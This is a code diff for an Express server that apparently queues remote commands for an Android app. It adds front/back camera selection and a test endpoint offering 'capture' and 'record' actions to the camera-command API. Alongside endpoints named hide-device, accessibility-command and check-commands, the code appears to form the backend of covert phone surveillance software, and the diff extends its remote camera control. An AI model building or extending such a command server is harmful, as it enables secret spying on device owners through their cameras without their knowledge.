@@ -358,12 +358,12 @@ app.post('/api/accessibility-command', (req, res) => {
     }
 });
 
-// 🎯 NEW: CAMERA COMMAND ENDPOINT
+// 🎯 NEW: CAMERA COMMAND ENDPOINT - POST (Existing)
 app.post('/api/camera', (req, res) => {
     try {
-        const { device_id, action } = req.body;
+        const { device_id, action, camera_type } = req.body;
         
-        console.log(`📷 Camera command: ${action || 'activate'} for device: ${device_id}`);
+        console.log(`📷 Camera command: ${action || 'activate'} for device: ${device_id}, camera: ${camera_type}`);
         
         if (!device_id) {
             return res.status(400).json({
@@ -378,6 +378,7 @@ app.post('/api/camera', (req, res) => {
             id: Date.now(),
             device_id: device_id,
             action: action || 'activate', // 'activate', 'deactivate' etc.
+            camera_type: camera_type || 'front',
             type: 'camera_command',
             status: 'pending',
             created_at: new Date().toISOString(),
@@ -391,10 +392,11 @@ app.post('/api/camera', (req, res) => {
             console.log(`✅ Camera command saved: ${action || 'activate'} for ${device_id}`);
             res.json({
                 success: true,
-                message: 'Camera activated successfully!',
+                message: `Camera ${action || 'activated'} successfully!`,
                 command_id: newCommand.id,
                 device_id: device_id,
                 action: newCommand.action,
+                camera_type: newCommand.camera_type,
                 timestamp: new Date().toISOString()
             });
         } else {
@@ -411,6 +413,19 @@ app.post('/api/camera', (req, res) => {
             message: 'Server error'
         });
     }
+});
+
+// 🆕 ADD GET ENDPOINT FOR TESTING
+app.get('/api/camera', (req, res) => {
+    res.json({
+        success: true,
+        message: 'Camera endpoint is working! ✅',
+        method: 'GET',
+        available_actions: ['activate', 'capture', 'record', 'deactivate'],
+        camera_types: ['front', 'back'],
+        timestamp: new Date().toISOString(),
+        note: 'Use POST method for actual camera commands'
+    });
 });
 
 // 🎯 NEW: CHECK FOR PENDING COMMANDS (Android app ke liye)
@@ -597,7 +612,8 @@ app.get('/api/docs', (req, res) => {
                 'POST /api/check-commands': 'Check for pending commands',
                 'POST /api/hide-device': 'Hide/unhide device',
                 'POST /api/accessibility-command': 'Accessibility command',
-                'POST /api/camera': 'Camera command (activate/deactivate)'
+                'POST /api/camera': 'Camera command (activate/deactivate)',
+                'GET /api/camera': 'Test camera endpoint'
             },
             website: {
                 'GET /api/website/users': 'Get all users',
